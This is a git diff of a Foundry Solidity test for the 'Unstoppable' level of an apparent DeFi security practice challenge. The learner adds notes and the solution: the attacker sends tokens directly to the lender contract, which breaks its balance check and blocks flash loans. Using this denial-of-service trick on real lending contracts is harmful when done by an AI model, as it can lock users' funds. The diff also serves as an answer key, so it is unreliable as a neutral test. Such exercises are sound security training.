@@ -28,6 +28,8 @@ contract Unstoppable is Test {
         address payable[] memory users = utils.createUsers(2);
         attacker = users[0];
         someUser = users[1];
+        // label is used to give a name in the test trace
+        // https://book.getfoundry.sh/cheatcodes/label?highlight=label#label
         vm.label(someUser, "User");
         vm.label(attacker, "Attacker");
 
@@ -35,7 +37,7 @@ contract Unstoppable is Test {
         vm.label(address(dvt), "DVT");
 
         unstoppableLender = new UnstoppableLender(address(dvt));
-        vm.label(address(unstoppableLender), "Unstoppable Lender");
+        vm.label(address(unstoppableLender), "Unstoppable Lenderx");
 
         dvt.approve(address(unstoppableLender), TOKENS_IN_POOL);
         unstoppableLender.depositTokens(TOKENS_IN_POOL);
@@ -60,12 +62,39 @@ contract Unstoppable is Test {
         /**
          * EXPLOIT START *
          */
+        // Your exploit goes here
+        // for foudnry practice
+        // 1. warp
+        vm.warp(100);
+        require(block.timestamp == 100);
+        // 2.
+        console.log("Attacker balance: ", dvt.balanceOf(attacker));
+        console.log(
+            "unstoppableLender balance: ",
+            dvt.balanceOf(address(unstoppableLender))
+        );
+        validation(); // before sending the token, this works!
+
+        // ^ Unrelated part upside
+        // -----------------------
+        // Answer:
+        vm.startPrank(attacker);
+        dvt.transfer(address(unstoppableLender), 10);
+        vm.stopPrank();
+        // assertEq(
+        //     dvt.balanceOf(address(unstoppableLender)),
+        //     TOKENS_IN_POOL - 1011
+        // );
+        // vm.stopPrank();
         /**
          * EXPLOIT END *
          */
         vm.expectRevert(UnstoppableLender.AssertionViolated.selector);
+        // this is expecting the function to fail. The position of this line is like wherever you wnat to put in the func.
         validation();
-        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
+        console.log(
+            unicode"\n🎉 Congratulations, you can go to the next level! 🎉"
+        );
     }
 
     function validation() internal {
